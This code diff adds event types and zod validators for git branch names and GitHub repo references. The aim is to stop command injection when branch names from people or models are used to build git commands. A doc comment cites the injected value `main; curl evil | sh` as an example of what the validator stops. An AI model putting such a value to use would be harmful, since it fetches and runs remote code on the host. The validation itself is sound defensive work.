@@ -375,6 +375,10 @@ export const EventType = z.enum([
   "site.published",
   "site.restored",
   "site.ship_requested",
+  "code.session_created",
+  "code.staged",
+  "code.discarded",
+  "code.apply_requested",
   "agent.updated",
   "audit",
 ]);
@@ -429,6 +433,29 @@ export const CompanyProfile = z.object({
   techStack: z.array(z.string()).default([]),
 });
 export type CompanyProfile = z.infer<typeof CompanyProfile>;
+
+/**
+ * A git branch name, validated as a ref rather than trusted as text.
+ *
+ * Branch names come from a person or a model and are then used to build git commands, so a name like
+ * `main; curl evil | sh` must be impossible rather than merely unlikely. This applies git's own ref rules to the
+ * cases that matter (no leading dash, no `..`, no `@{`, no `//`, no control characters or spaces, no trailing
+ * dot, slash or `.lock`), and callers that pass the ref through the environment instead of a command string do so
+ * on top of that. It lives here because the tools and the code IDE both need the same answer.
+ */
+export const BranchName = z
+  .string()
+  .min(1)
+  .max(200)
+  .regex(/^[A-Za-z0-9._/-]+$/, "must contain only letters, digits, dot, slash, dash or underscore")
+  .refine((value) => !value.startsWith("-") && !value.includes("..") && !value.includes("//") && !value.includes("@{"), "must be a valid git branch name")
+  .refine((value) => !value.endsWith("/") && !value.endsWith(".") && !value.endsWith(".lock") && !value.startsWith("/"), "must be a valid git branch name");
+
+/** `owner/repo`, the spelling GitHub uses. */
+export const RepoRef = z
+  .string()
+  .max(200)
+  .regex(/^[\w.-]+\/[\w.-]+$/, "must look like owner/repo");
 
 export const ID = z.string().min(1);
 export const Paginated = <T extends z.ZodTypeAny>(item: T) =>
